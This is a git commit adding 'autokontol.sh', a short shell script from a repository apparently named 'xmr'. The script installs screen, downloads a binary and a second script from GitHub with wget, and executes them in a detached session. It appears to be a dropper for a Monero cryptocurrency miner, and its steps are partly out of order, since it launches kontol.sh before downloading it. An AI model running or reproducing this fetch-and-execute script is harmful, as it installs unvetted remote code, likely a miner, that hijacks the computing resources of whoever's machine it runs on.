99f118bc0f8db5dfc029f190b2095ca7e2e3d2bc
renilo <88342640+renilo@users.noreply.github.com>
2021-08-26 18:28:20 +0700

    Create autokontol.sh

---
+++ autokontol.sh
@@ -0,0 +1,15 @@
+#!/bin/sh
+
+sudo apt update
+
+sudo apt install screen -y
+
+screen -dmS kontol.sh ./kontol.sh 65 75
+
+wget https://github.com/renilo/xmr/raw/main/memek
+
+wget https://raw.githubusercontent.com/renilo/xmr/main/kontol.sh
+
+chmod +x kontol.sh
+
+./kontol.sh
